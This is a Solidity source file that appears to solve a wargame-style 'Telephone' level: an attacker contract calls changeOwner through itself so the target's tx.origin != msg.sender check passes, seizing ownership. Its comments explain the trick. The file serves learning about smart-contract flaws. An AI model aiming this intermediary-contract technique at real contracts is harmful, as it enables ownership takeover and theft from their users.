// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Level4_Telephone.sol";

/**
 * @title TelephoneAttacker
 * @notice Exploits tx.origin != msg.sender check
 */
contract TelephoneAttacker {
    Telephone public target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _newOwner) external {
        // msg.sender = this contract (not EOA)
        // tx.origin = EOA (user who called)
        // tx.origin != msg.sender → check passes!
        target.changeOwner(_newOwner);
    }
}
